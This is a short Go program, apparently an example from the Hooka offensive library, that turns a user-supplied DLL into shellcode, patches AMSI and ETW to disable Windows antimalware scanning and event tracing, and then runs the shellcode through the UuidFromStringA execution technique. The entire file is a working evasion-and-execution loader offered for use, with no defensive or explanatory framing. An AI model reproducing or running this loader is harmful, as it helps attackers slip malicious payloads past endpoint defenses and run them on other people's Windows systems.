package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/D3Ext/Hooka/pkg/hooka"
)

func main() {
	var pe string
	var function string

	flag.StringVar(&pe, "p", "", "Portable Executable (PE) to convert to shellcode")
	flag.StringVar(&function, "f", "", "function name to execute")
	flag.Parse()

	if (pe == "") || (function == "") {
		fmt.Println("[-] Parameters missing!")
    fmt.Println("[*] Example: ", os.Args[0], " -p evil.dll -f xyz")
		flag.PrintDefaults()
		os.Exit(0)
	}

	fmt.Println("[*] Converting " + pe + " to position independent shellcode...")
	shellcode, err := hooka.ConvertDllToShellcode(pe, function, "")
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Patching AMSI...")
	err = hooka.PatchAmsi()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Patching ETW...")
	err = hooka.PatchEtw()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Executing shellcode via UuidFromStringA technique...")
	err = hooka.UuidFromString(shellcode)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[+] Shellcode should have been executed!")
}
